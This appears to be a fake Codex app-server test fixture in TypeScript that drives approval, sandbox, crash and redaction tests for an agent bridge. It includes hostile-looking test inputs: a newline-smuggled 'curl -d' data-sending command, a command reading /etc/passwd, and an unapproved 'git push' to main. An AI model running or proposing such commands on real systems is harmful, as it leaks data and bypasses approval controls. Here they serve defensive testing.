import { createInterface } from "node:readline";
import { appendFileSync, existsSync, writeFileSync } from "node:fs";

type Request = {
  jsonrpc: "2.0";
  id?: string | number;
  method?: string;
  params?: unknown;
  result?: unknown;
};

function send(message: object): void {
  process.stdout.write(`${JSON.stringify(message)}\n`);
}

let threadSequence = 0;
let turnSequence = 0;
const approvalFlows = new Map<
  string | number,
  {
    threadId: string;
    turnId: string;
    cwd: string;
    decisions: string[];
    stage: "command" | "file" | "terminal";
    omitFileOptionalFields?: boolean;
  }
>();
const waitingTurns = new Map<
  string,
  {
    threadId: string;
    mode: "timeout" | "timeout-completes" | "cancel";
  }
>();
const startupMode = process.env.FAKE_START_MODE;
const startupMarker = process.env.FAKE_MARKER;
const fakeVersion = process.env.FAKE_VERSION ?? "0.145.0";

function thread(id: string, cwd: string): object {
  return {
    id,
    sessionId: id,
    forkedFromId: null,
    parentThreadId: null,
    preview: "",
    ephemeral: false,
    modelProvider: "openai",
    createdAt: 1,
    updatedAt: 1,
    recencyAt: 1,
    status: { type: "idle" },
    path: null,
    cwd,
    cliVersion: "0.145.0",
    source: "appServer",
    threadSource: null,
    agentNickname: null,
    agentRole: null,
    gitInfo: null,
    name: null,
    turns: [],
  };
}

function turn(id: string, status = "inProgress"): object {
  return {
    id,
    items: [],
    itemsView: { type: "full" },
    status,
    error: null,
    startedAt: 1,
    completedAt: status === "inProgress" ? null : 2,
    durationMs: status === "inProgress" ? null : 1,
  };
}

function validateReadOnly(params: Record<string, unknown>): string | null {
  if (params.model !== "gpt-5.6-sol") return "wrong model";
  if (params.approvalPolicy !== "on-request") return "wrong approval policy";
  if (params.approvalsReviewer !== "user") return "wrong approval reviewer";
  if (params.sandbox !== undefined && params.sandbox !== "read-only") {
    return "wrong thread sandbox";
  }
  const sandboxPolicy = params.sandboxPolicy as
    { type?: string; networkAccess?: boolean } | undefined;
  if (
    sandboxPolicy &&
    (sandboxPolicy.type !== "readOnly" || sandboxPolicy.networkAccess !== false)
  ) {
    return "wrong turn sandbox";
  }
  const config = params.config as
    | {
        model_reasoning_effort?: string;
        web_search?: string;
        mcp_servers?: Record<string, unknown>;
        features?: {
          apps?: boolean;
          remote_plugin?: boolean;
          multi_agent?: boolean;
        };
        shell_environment_policy?: {
          inherit?: string;
          include_only?: string[];
          set?: Record<string, string>;
        };
        sandbox_workspace_write?: { network_access?: boolean };
      }
    | undefined;
  if (
    config &&
    (config.model_reasoning_effort !== "max" ||
      config.web_search !== "disabled" ||
      (config.mcp_servers?.fake_external as { enabled?: boolean } | undefined)
        ?.enabled !== false ||
      config.features?.apps !== false ||
      config.features.remote_plugin !== false ||
      config.features.multi_agent !== false ||
      config.shell_environment_policy?.inherit !== "none" ||
      config.shell_environment_policy.include_only?.length !== 0 ||
      "CODEX_BRIDGE_TOKEN" in (config.shell_environment_policy.set ?? {}) ||
      config.sandbox_workspace_write?.network_access !== false)
  ) {
    return "network is not disabled";
  }
  return null;
}

function validateWrite(params: Record<string, unknown>): string | null {
  if (params.model !== "gpt-5.6-sol") return "wrong model";
  if (params.approvalPolicy !== "on-request") return "wrong approval policy";
  if (params.approvalsReviewer !== "user") return "wrong approval reviewer";
  if (params.sandbox !== undefined && params.sandbox !== "workspace-write") {
    return "wrong thread sandbox";
  }
  const cwd = String(params.cwd);
  if (!cwd.includes("/.voiss/worktrees/")) return "write run is not isolated";
  if (params.sandbox === "workspace-write") {
    const runtimeWorkspaceRoots = params.runtimeWorkspaceRoots as
      string[] | undefined;
    if (
      runtimeWorkspaceRoots?.length !== 1 ||
      runtimeWorkspaceRoots[0] !== cwd
    ) {
      return "wrong runtime workspace root";
    }
  }
  const sandboxPolicy = params.sandboxPolicy as
    | { type?: string; networkAccess?: boolean; writableRoots?: string[] }
    | undefined;
  if (
    sandboxPolicy &&
    (sandboxPolicy.type !== "workspaceWrite" ||
      sandboxPolicy.networkAccess !== false ||
      sandboxPolicy.writableRoots?.length !== 1 ||
      sandboxPolicy.writableRoots[0] !== cwd)
  ) {
    return "wrong write sandbox";
  }
  const config = params.config as
    | {
        model_reasoning_effort?: string;
        web_search?: string;
        mcp_servers?: Record<string, unknown>;
        features?: {
          apps?: boolean;
          remote_plugin?: boolean;
          multi_agent?: boolean;
        };
        shell_environment_policy?: {
          inherit?: string;
          include_only?: string[];
          set?: Record<string, string>;
        };
        sandbox_workspace_write?: { network_access?: boolean };
      }
    | undefined;
  if (
    config &&
    (config.model_reasoning_effort !== "max" ||
      config.web_search !== "disabled" ||
      (config.mcp_servers?.fake_external as { enabled?: boolean } | undefined)
        ?.enabled !== false ||
      config.features?.apps !== false ||
      config.features.remote_plugin !== false ||
      config.features.multi_agent !== false ||
      config.shell_environment_policy?.inherit !== "none" ||
      config.shell_environment_policy.include_only?.length !== 0 ||
      "CODEX_BRIDGE_TOKEN" in (config.shell_environment_policy.set ?? {}) ||
      config.sandbox_workspace_write?.network_access !== false)
  ) {
    return "network is not disabled";
  }
  return null;
}

function completeApprovalFlow(flow: {
  threadId: string;
  turnId: string;
  cwd: string;
  decisions: string[];
}): void {
  sendValidation(flow.threadId, flow.turnId, flow.cwd, "pnpm test", 0);
  send({
    jsonrpc: "2.0",
    method: "item/agentMessage/delta",
    params: {
      threadId: flow.threadId,
      turnId: flow.turnId,
      itemId: "message-approval",
      delta: flow.decisions.join(","),
    },
  });
  send({
    jsonrpc: "2.0",
    method: "turn/completed",
    params: {
      threadId: flow.threadId,
      turn: turn(flow.turnId, "completed"),
    },
  });
}

function sendValidation(
  threadId: string,
  turnId: string,
  cwd: string,
  command: string,
  exitCode: number,
): void {
  send({
    jsonrpc: "2.0",
    method: "item/completed",
    params: {
      threadId,
      turnId,
      completedAtMs: 2,
      item: {
        type: "commandExecution",
        id: `validation-${turnId}`,
        command,
        cwd,
        processId: null,
        source: "agent",
        status: exitCode === 0 ? "completed" : "failed",
        commandActions: [],
        aggregatedOutput:
          exitCode === 0 ? "validation passed" : "validation failed",
        exitCode,
        durationMs: 1,
      },
    },
  });
}

const input = createInterface({ input: process.stdin });
input.on("line", (line) => {
  const request = JSON.parse(line) as Request;
  if (request.method === undefined && request.id !== undefined) {
    const flow = approvalFlows.get(request.id);
    if (!flow) return;
    approvalFlows.delete(request.id);
    const decision = (request.result as { decision?: string } | undefined)
      ?.decision;
    flow.decisions.push(String(decision));
    if (flow.stage === "command") {
      const id = `approval-file-${flow.turnId}`;
      approvalFlows.set(id, { ...flow, stage: "file" });
      const params: Record<string, unknown> = {
        threadId: flow.threadId,
        turnId: flow.turnId,
        itemId: "file-approval",
        startedAtMs: 2,
      };
      if (!flow.omitFileOptionalFields) {
        params.reason = "Apply the approved local patch.";
        params.grantRoot = flow.cwd;
      }
      send({
        jsonrpc: "2.0",
        id,
        method: "item/fileChange/requestApproval",
        params,
      });
    } else {
      completeApprovalFlow(flow);
    }
    return;
  }
  if (request.method === "initialize") {
    if (
      startupMode === "assert-clean-env" &&
      (process.env.CODEX_BRIDGE_TOKEN ||
        process.env.SLACK_BOT_TOKEN ||
        process.env.OPENAI_API_KEY ||
        process.env.AWS_SECRET_ACCESS_KEY)
    ) {
      process.exit(19);
      return;
    }
    if (
      (startupMode === "crash-once" ||
        startupMode === "malformed-once" ||
        startupMode === "semantic-malformed-once") &&
      startupMarker &&
      !existsSync(startupMarker)
    ) {
      writeFileSync(startupMarker, startupMode);
      if (startupMode === "malformed-once") {
        process.stdout.write("{malformed json\n");
      } else if (startupMode === "semantic-malformed-once") {
        process.stdout.write("null\n");
      } else {
        process.exit(17);
      }
      return;
    }
    send({
      jsonrpc: "2.0",
      id: request.id,
      result: {
        userAgent: `fake-codex/${fakeVersion}`,
        codexHome: "/tmp/fake-codex",
        platformFamily: "unix",
        platformOs: "linux",
      },
    });
  } else if (request.method === "account/read") {
    send({
      jsonrpc: "2.0",
      id: request.id,
      result: {
        account: {
          type: "chatgpt",
          email: "operator@example.test",
          planType: "pro",
        },
        requiresOpenaiAuth: true,
      },
    });
    if (startupMode === "crash-after-ready" && startupMarker) {
      appendFileSync(startupMarker, "ready\n");
      setTimeout(() => process.exit(23), 5);
    }
    if (startupMode === "account-logout-after-ready") {
      setTimeout(() => {
        send({
          jsonrpc: "2.0",
          method: "account/updated",
          params: { authMode: null, planType: null },
        });
      }, 5);
    }
  } else if (request.method === "config/read") {
    send({
      jsonrpc: "2.0",
      id: request.id,
      result: {
        config: {
          mcp_servers: {
            fake_external: {
              command: "fake-network-capable-mcp",
              enabled: true,
            },
          },
        },
        origins: {},
        layers: null,
      },
    });
  } else if (request.method === "thread/start") {
    const params = request.params as Record<string, unknown>;
    const write = params.sandbox === "workspace-write";
    const invalid = write ? validateWrite(params) : validateReadOnly(params);
    if (invalid) {
      send({
        jsonrpc: "2.0",
        id: request.id,
        error: { code: -32602, message: invalid },
      });
      return;
    }
    const id = `thread-${++threadSequence}`;
    send({
      jsonrpc: "2.0",
      id: request.id,
      result: {
        thread: thread(id, String(params.cwd)),
        model: params.model,
        modelProvider: "openai",
        serviceTier: null,
        cwd: params.cwd,
        runtimeWorkspaceRoots: params.runtimeWorkspaceRoots ?? [],
        instructionSources: [],
        approvalPolicy: params.approvalPolicy,
        approvalsReviewer: params.approvalsReviewer,
        sandbox: write
          ? {
              type: "workspaceWrite",
              writableRoots: [],
              networkAccess: false,
              excludeTmpdirEnvVar: true,
              excludeSlashTmp: true,
            }
          : { type: "readOnly", networkAccess: false },
        reasoningEffort: "max",
      },
    });
  } else if (request.method === "thread/resume") {
    const params = request.params as Record<string, unknown>;
    const invalid = validateReadOnly(params);
    if (invalid) {
      send({
        jsonrpc: "2.0",
        id: request.id,
        error: { code: -32602, message: invalid },
      });
      return;
    }
    send({
      jsonrpc: "2.0",
      id: request.id,
      result: {
        thread: thread(String(params.threadId), String(params.cwd)),
        model: params.model,
        modelProvider: "openai",
        serviceTier: null,
        cwd: params.cwd,
        instructionSources: [],
        approvalPolicy: params.approvalPolicy,
        approvalsReviewer: params.approvalsReviewer,
        sandbox: { type: "readOnly", networkAccess: false },
        reasoningEffort: "max",
      },
    });
  } else if (request.method === "thread/archive") {
    const params = request.params as Record<string, unknown>;
    const threadId = String(params.threadId ?? "");
    send({ jsonrpc: "2.0", id: request.id, result: {} });
    queueMicrotask(() => {
      send({
        jsonrpc: "2.0",
        method: "thread/archived",
        params: { threadId },
      });
    });
  } else if (request.method === "turn/start") {
    const params = request.params as Record<string, unknown>;
    const write =
      (params.sandboxPolicy as { type?: string } | undefined)?.type ===
      "workspaceWrite";
    const invalid = write ? validateWrite(params) : validateReadOnly(params);
    if (invalid) {
      send({
        jsonrpc: "2.0",
        id: request.id,
        error: { code: -32602, message: invalid },
      });
      return;
    }
    const turnId = `turn-${++turnSequence}`;
    const threadId = String(params.threadId);
    send({
      jsonrpc: "2.0",
      id: request.id,
      result: { turn: turn(turnId) },
    });
    const prompt = String(
      (params.input as Array<{ text?: string }> | undefined)?.[0]?.text ?? "",
    );
    if (prompt.includes("OPTIONAL_APPROVAL_FIELDS")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-optional-${turnId}`;
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "command",
          omitFileOptionalFields: true,
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            turnId,
            itemId: "command-optional",
            startedAtMs: 1,
            environmentId: null,
            command: "git status --short",
            cwd: null,
            commandActions: null,
          },
        });
      });
      return;
    }
    if (prompt.includes("NULLABLE_ACTION_PATHS")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-nullable-actions-${turnId}`;
        const command = "git status --short";
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "terminal",
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            turnId,
            itemId: "command-nullable-actions",
            startedAtMs: 1,
            environmentId: null,
            command,
            cwd: null,
            commandActions: [
              { type: "listFiles", command, path: null },
              { type: "search", command, query: null, path: null },
            ],
            availableDecisions: ["accept", "decline"],
          },
        });
      });
      return;
    }
    if (
      prompt.includes("MISSING_ENVIRONMENT_APPROVAL") ||
      prompt.includes("REMOTE_ENVIRONMENT_APPROVAL") ||
      prompt.includes("ADDITIONAL_PERMISSIONS_APPROVAL") ||
      prompt.includes("NO_ACCEPT_DECISION_APPROVAL") ||
      prompt.includes("MALFORMED_ACTIONS_APPROVAL") ||
      prompt.includes("OUTSIDE_READ_COMMAND_APPROVAL")
    ) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-fail-closed-${turnId}`;
        const command = prompt.includes("OUTSIDE_READ_COMMAND_APPROVAL")
          ? "git diff --no-index /etc/passwd /etc/hosts"
          : "git status --short";
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "terminal",
        });
        const approvalParams: Record<string, unknown> = {
          threadId,
          turnId,
          itemId: "command-fail-closed",
          startedAtMs: 1,
          command,
          cwd: null,
          commandActions: null,
        };
        if (!prompt.includes("MISSING_ENVIRONMENT_APPROVAL")) {
          approvalParams.environmentId = prompt.includes(
            "REMOTE_ENVIRONMENT_APPROVAL",
          )
            ? "remote-environment"
            : null;
        }
        if (prompt.includes("ADDITIONAL_PERMISSIONS_APPROVAL")) {
          approvalParams.additionalPermissions = {
            network: { enabled: true },
            fileSystem: null,
          };
        }
        if (prompt.includes("NO_ACCEPT_DECISION_APPROVAL")) {
          approvalParams.availableDecisions = ["decline", "cancel"];
        }
        if (prompt.includes("MALFORMED_ACTIONS_APPROVAL")) {
          approvalParams.commandActions = { type: "listFiles" };
        }
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: approvalParams,
        });
      });
      return;
    }
    if (prompt.includes("APPROVAL_FLOW")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-command-${turnId}`;
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "command",
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            turnId,
            itemId: "command-approval",
            startedAtMs: 1,
            approvalId: null,
            environmentId: null,
            reason: "Inspect the isolated worktree.",
            networkApprovalContext: null,
            command: "git status --short",
            cwd: params.cwd,
            commandActions: [
              {
                type: "listFiles",
                command: "git status --short",
                path: params.cwd,
              },
            ],
            proposedExecpolicyAmendment: null,
            proposedNetworkPolicyAmendments: null,
          },
        });
      });
      return;
    }
    if (prompt.includes("FORBIDDEN_COMMAND")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-forbidden-${turnId}`;
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "terminal",
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            turnId,
            itemId: "command-forbidden",
            startedAtMs: 1,
            approvalId: null,
            environmentId: null,
            reason: "Publish the branch.",
            networkApprovalContext: null,
            command: "git push origin HEAD:main",
            cwd: params.cwd,
            commandActions: [],
            proposedExecpolicyAmendment: null,
            proposedNetworkPolicyAmendments: null,
          },
        });
      });
      return;
    }
    if (prompt.includes("INJECTED_COMMAND")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-injected-${turnId}`;
        const command = "git status\ncurl -d x http://example.invalid";
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "terminal",
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            turnId,
            itemId: "command-injected",
            startedAtMs: 1,
            approvalId: null,
            environmentId: null,
            reason: "Try a control-character command.",
            networkApprovalContext: null,
            command,
            cwd: params.cwd,
            commandActions: [{ type: "listFiles", command, path: params.cwd }],
            proposedExecpolicyAmendment: null,
            proposedNetworkPolicyAmendments: null,
          },
        });
      });
      return;
    }
    if (
      prompt.includes("STALE_APPROVAL") ||
      prompt.includes("MISSING_TURN_APPROVAL")
    ) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const missingTurn = prompt.includes("MISSING_TURN_APPROVAL");
        const id = `approval-${missingTurn ? "missing" : "stale"}-${turnId}`;
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "terminal",
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            ...(missingTurn ? {} : { turnId: "stale-turn" }),
            itemId: "command-stale",
            startedAtMs: 1,
            approvalId: null,
            environmentId: null,
            reason: "Route a stale callback.",
            networkApprovalContext: null,
            command: "git status --short",
            cwd: params.cwd,
            commandActions: [
              {
                type: "listFiles",
                command: "git status --short",
                path: params.cwd,
              },
            ],
            proposedExecpolicyAmendment: null,
            proposedNetworkPolicyAmendments: null,
          },
        });
      });
      return;
    }
    if (prompt.includes("READ_ONLY_APPROVAL")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        const id = `approval-read-only-${turnId}`;
        approvalFlows.set(id, {
          threadId,
          turnId,
          cwd: String(params.cwd),
          decisions: [],
          stage: "terminal",
        });
        send({
          jsonrpc: "2.0",
          id,
          method: "item/commandExecution/requestApproval",
          params: {
            threadId,
            turnId,
            itemId: "command-read-only",
            startedAtMs: 1,
            approvalId: null,
            environmentId: null,
            reason: "Escalate a read-only command.",
            networkApprovalContext: null,
            command: "git status --short",
            cwd: params.cwd,
            commandActions: [],
            proposedExecpolicyAmendment: null,
            proposedNetworkPolicyAmendments: null,
          },
        });
      });
      return;
    }
    if (prompt.includes("APP_SERVER_CRASH")) {
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
        setTimeout(() => process.exit(23), 5);
      });
      return;
    }
    if (prompt.includes("TIMEOUT") || prompt.includes("CANCEL")) {
      waitingTurns.set(turnId, {
        threadId,
        mode: prompt.includes("TIMEOUT_COMPLETES")
          ? "timeout-completes"
          : prompt.includes("TIMEOUT")
            ? "timeout"
            : "cancel",
      });
      queueMicrotask(() => {
        send({
          jsonrpc: "2.0",
          method: "turn/started",
          params: { threadId, turn: turn(turnId) },
        });
      });
      return;
    }
    queueMicrotask(() => {
      if (prompt.includes("EVIDENCE_FLOW")) {
        writeFileSync(
          String(params.cwd) + "/feature.txt",
          "generated during Codex run\n",
        );
      } else if (prompt.includes("FAILED_VALIDATION_FLOW")) {
        sendValidation(
          threadId,
          turnId,
          String(params.cwd),
          "git diff --check",
          0,
        );
        sendValidation(
          threadId,
          turnId,
          String(params.cwd),
          "pnpm typecheck",
          1,
        );
      } else if (prompt.includes("HELP_VALIDATION_FLOW")) {
        sendValidation(
          threadId,
          turnId,
          String(params.cwd),
          "pytest --help",
          0,
        );
      } else if (prompt.includes("OUTSIDE_VALIDATION_FLOW")) {
        sendValidation(threadId, turnId, process.cwd(), "git diff --check", 0);
      } else if (prompt.includes("STALE_VALIDATION_FLOW")) {
        sendValidation(
          threadId,
          turnId,
          String(params.cwd),
          "git diff --check",
          0,
        );
        writeFileSync(
          String(params.cwd) + "/after-validation.txt",
          "changed after validation\n",
        );
        send({
          jsonrpc: "2.0",
          method: "item/fileChange/patchUpdated",
          params: {
            threadId,
            turnId,
            itemId: "file-after-validation",
            changes: [
              {
                path: "after-validation.txt",
                kind: { type: "add" },
                diff: "+changed after validation",
              },
            ],
          },
        });
      }
      send({
        jsonrpc: "2.0",
        method: "turn/started",
        params: { threadId, turn: turn(turnId) },
      });
      send({
        jsonrpc: "2.0",
        method: "item/started",
        params: {
          threadId,
          turnId,
          startedAtMs: 1,
          item: { type: "plan", id: "plan-1", text: "" },
        },
      });
      send({
        jsonrpc: "2.0",
        method: "item/plan/delta",
        params: { threadId, turnId, itemId: "plan-1", delta: "Inspect" },
      });
      send({
        jsonrpc: "2.0",
        method: "turn/plan/updated",
        params: {
          threadId,
          turnId,
          explanation: null,
          plan: [{ step: "Inspect", status: "inProgress" }],
        },
      });
      send({
        jsonrpc: "2.0",
        method: "item/commandExecution/outputDelta",
        params: {
          threadId,
          turnId,
          itemId: "cmd-1",
          delta: prompt.includes("REDACTION")
            ? `Authorization: Bearer secret-token-123 ${"x".repeat(500)}`
            : "checked\n",
        },
      });
      send({
        jsonrpc: "2.0",
        method: "item/fileChange/patchUpdated",
        params: {
          threadId,
          turnId,
          itemId: "file-1",
          changes: [
            {
              path: "README.md",
              kind: { type: "update", move_path: null },
              diff: "+ok",
            },
          ],
        },
      });
      send({
        jsonrpc: "2.0",
        method: "turn/diff/updated",
        params: {
          threadId,
          turnId,
          diff: "diff --git a/README.md b/README.md",
        },
      });
      send({
        jsonrpc: "2.0",
        method: "item/agentMessage/delta",
        params: { threadId, turnId, itemId: "message-1", delta: "Ready" },
      });
      send({
        jsonrpc: "2.0",
        method: "item/completed",
        params: {
          threadId,
          turnId,
          completedAtMs: 2,
          item: {
            type: "agentMessage",
            id: "message-1",
            text: "Ready",
            phase: "final_answer",
            memoryCitation: null,
          },
        },
      });
      if (prompt.includes("EVIDENCE_FLOW")) {
        sendValidation(
          threadId,
          turnId,
          String(params.cwd),
          "/bin/bash -lc 'python3 -m pytest -q'",
          0,
        );
        send({
          jsonrpc: "2.0",
          method: "item/completed",
          params: {
            threadId,
            turnId,
            completedAtMs: 3,
            item: {
              type: "commandExecution",
              id: `post-validation-read-${turnId}`,
              command:
                "/bin/bash -lc 'git diff --check && git diff -- feature.txt && git status --short && rg -n generated feature.txt'",
              cwd: params.cwd,
              processId: null,
              source: "agent",
              status: "completed",
              commandActions: [
                {
                  type: "search",
                  command: "rg -n generated feature.txt",
                  query: "generated",
                  path: "feature.txt",
                },
              ],
              aggregatedOutput: "M feature.txt",
              exitCode: 0,
              durationMs: 1,
            },
          },
        });
      }
      send({
        jsonrpc: "2.0",
        method: "turn/completed",
        params: { threadId, turn: turn(turnId, "completed") },
      });
    });
  } else if (request.method === "turn/interrupt") {
    const params = request.params as { threadId: string; turnId: string };
    const waiting = waitingTurns.get(params.turnId);
    send({
      jsonrpc: "2.0",
      method: "item/agentMessage/delta",
      params: {
        threadId: params.threadId,
        turnId: params.turnId,
        itemId: "interrupt",
        delta: "interrupt received",
      },
    });
    if (waiting?.mode === "timeout-completes") {
      waitingTurns.delete(params.turnId);
      send({
        jsonrpc: "2.0",
        method: "turn/completed",
        params: {
          threadId: params.threadId,
          turn: turn(params.turnId, "interrupted"),
        },
      });
    }
    send({ jsonrpc: "2.0", id: request.id, result: {} });
    if (waiting?.mode === "cancel") {
      waitingTurns.delete(params.turnId);
      send({
        jsonrpc: "2.0",
        method: "turn/completed",
        params: {
          threadId: params.threadId,
          turn: turn(params.turnId, "interrupted"),
        },
      });
    }
  }
});
